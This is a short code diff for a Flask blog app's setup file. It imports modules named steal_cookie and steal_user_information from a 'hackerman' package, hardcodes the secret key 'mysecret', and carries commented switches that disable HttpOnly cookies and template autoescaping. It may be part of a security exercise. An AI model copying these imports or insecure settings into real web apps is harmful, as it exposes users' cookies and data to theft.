@@ -2,9 +2,7 @@ from flask import Flask
 from flask_sqlalchemy import SQLAlchemy
 from flask_login import LoginManager
 from threading import Thread
-from jinja2 import select_autoescape
-import steal_cookie
-import steal_user_information
+from hackerman import steal_cookie, steal_user_information
 
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///blog.db'
@@ -13,7 +11,6 @@ app.config['SECRET_KEY'] = 'mysecret'
 #app.config['SESSION_COOKIE_HTTPONLY'] = False
 #Uncomment to turn off autoescape safeguard:
 #app.jinja_env.autoescape = select_autoescape(enabled_extensions=(), default=False)
-
 
 db = SQLAlchemy(app)
 
